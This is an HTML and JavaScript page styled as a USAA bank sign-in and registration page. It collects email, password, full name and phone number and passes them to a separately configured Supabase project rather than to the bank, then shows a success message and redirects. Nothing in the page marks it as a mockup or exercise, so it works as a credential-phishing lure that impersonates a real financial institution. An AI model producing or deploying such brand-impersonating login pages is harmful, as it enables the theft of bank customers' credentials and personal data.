<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USAA - Access Your Account</title>
  <!-- FontAwesome for icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #002649; /* USAA Deep Navy Blue */
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .auth-card {
      background-color: #ffffff;
      color: #333333;
      width: 100%;
      max-width: 420px;
      border-radius: 16px;
      padding: 30px 25px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }

    .brand-header {
      text-align: center;
      margin-bottom: 25px;
    }

    .brand-header i {
      font-size: 40px;
      color: #002649;
    }

    .brand-header h1 {
      font-size: 24px;
      font-weight: 700;
      color: #002649;
      margin-top: 8px;
    }

    .tabs {
      display: flex;
      border-bottom: 2px solid #e2e8f0;
      margin-bottom: 20px;
    }

    .tab-btn {
      flex: 1;
      padding: 12px;
      background: none;
      border: none;
      font-size: 16px;
      font-weight: 600;
      color: #64748b;
      cursor: pointer;
      text-align: center;
    }

    .tab-btn.active {
      color: #002649;
      border-bottom: 3px solid #002649;
    }

    .form-group {
      margin-bottom: 16px;
    }

    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #475569;
      margin-bottom: 6px;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      font-size: 15px;
      outline: none;
    }

    .form-group input:focus {
      border-color: #002649;
    }

    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #002649;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
    }

    .btn-submit:hover {
      background-color: #001a33;
    }

    .alert {
      padding: 10px;
      border-radius: 6px;
      font-size: 14px;
      margin-bottom: 15px;
      display: none;
    }

    .alert.error {
      background-color: #fee2e2;
      color: #991b1b;
      display: block;
    }

    .alert.success {
      background-color: #dcfce7;
      color: #166534;
      display: block;
    }
  </style>
</head>
<body>

  <div class="auth-card">
    <div class="brand-header">
      <i class="fa-solid fa-building-columns"></i>
      <h1>USAA</h1>
    </div>

    <!-- Tab Navigation -->
    <div class="tabs">
      <button id="login-tab" class="tab-btn active" onclick="switchTab('login')">Log In</button>
      <button id="register-tab" class="tab-btn" onclick="switchTab('register')">Register</button>
    </div>

    <!-- Alert Box -->
    <div id="alert-box" class="alert"></div>

    <!-- LOGIN FORM -->
    <form id="login-form">
      <div class="form-group">
        <label>Email Address</label>
        <input type="email" id="login-email" placeholder="enter your email" required />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="login-password" placeholder="••••••••" required />
      </div>
      <button type="submit" class="btn-submit">Log In</button>
    </form>

    <!-- REGISTRATION FORM -->
    <form id="register-form" style="display: none;">
      <div class="form-group">
        <label>Full Name</label>
        <input type="text" id="reg-name" placeholder="Sarah Jenkins" required />
      </div>
      <div class="form-group">
        <label>Email Address</label>
        <input type="email" id="reg-email" placeholder="sarah@example.com" required />
      </div>
      <div class="form-group">
        <label>Phone Number</label>
        <input type="tel" id="reg-phone" placeholder="+1 (555) 000-0000" required />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="reg-password" placeholder="Create password" required />
      </div>
      <button type="submit" class="btn-submit">Create Account</button>
    </form>
  </div>

  <script>
    // Supabase Credentials Setup
    const SUPABASE_URL = "YOUR_SUPABASE_PROJECT_URL"; // Replace with your URL
    const SUPABASE_ANON_KEY = "sb_publishable_2VBan5zlHsacQ4fvsBiBPQ_78oaUVth";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    function switchTab(tab) {
      showAlert('');
      if (tab === 'login') {
        document.getElementById('login-form').style.display = 'block';
        document.getElementById('register-form').style.display = 'none';
        document.getElementById('login-tab').classList.add('active');
        document.getElementById('register-tab').classList.remove('active');
      } else {
        document.getElementById('login-form').style.display = 'none';
        document.getElementById('register-form').style.display = 'block';
        document.getElementById('register-tab').classList.add('active');
        document.getElementById('login-tab').classList.remove('active');
      }
    }

    function showAlert(msg, type = 'error') {
      const box = document.getElementById('alert-box');
      if (!msg) {
        box.style.display = 'none';
        return;
      }
      box.className = `alert ${type}`;
      box.innerText = msg;
    }

    // Register Handler
    document.getElementById('register-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      showAlert('Creating account...', 'success');

      const name = document.getElementById('reg-name').value;
      const email = document.getElementById('reg-email').value;
      const phone = document.getElementById('reg-phone').value;
      const password = document.getElementById('reg-password').value;

      const { data, error } = await supabase.auth.signUp({
        email: email,
        password: password,
        options: {
          data: { full_name: name, phone: phone }
        }
      });

      if (error) {
        showAlert(error.message, 'error');
      } else {
        showAlert('Account created! Please check your email to verify.', 'success');
      }
    });

    // Login Handler
    document.getElementById('login-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      showAlert('Logging in...', 'success');

      const email = document.getElementById('login-email').value;
      const password = document.getElementById('login-password').value;

      const { data, error } = await supabase.auth.signInWithPassword({
        email: email,
        password: password
      });

      if (error) {
        showAlert(error.message, 'error');
      } else {
        showAlert('Success! Redirecting...', 'success');
        setTimeout(() => {
          window.location.href = 'dashboard.html';
        }, 1000);
      }
    });
  </script>
</body>
</html>
